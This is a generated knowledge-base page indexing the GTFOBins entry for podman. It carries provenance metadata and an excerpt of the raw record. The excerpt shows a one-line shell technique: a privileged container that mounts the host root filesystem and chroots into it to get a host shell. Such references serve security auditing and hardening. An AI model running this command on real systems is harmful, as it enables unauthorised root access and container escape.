---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# podman

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `podman` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/podman` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for podman covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/podman.md)
- Source verification: [source record](../../sources/gtfobins/podman.md)

## Aliases

- `podman`

## Source Verification

[source record](../../sources/gtfobins/podman.md)

## Evidence Excerpt

```text
_body: ''
_name: podman
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/podman
functions:
shell:
- code: podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
comment: This requires an actual image to be available (e.g., `alpine`) downloading it if not present.
contexts:
```
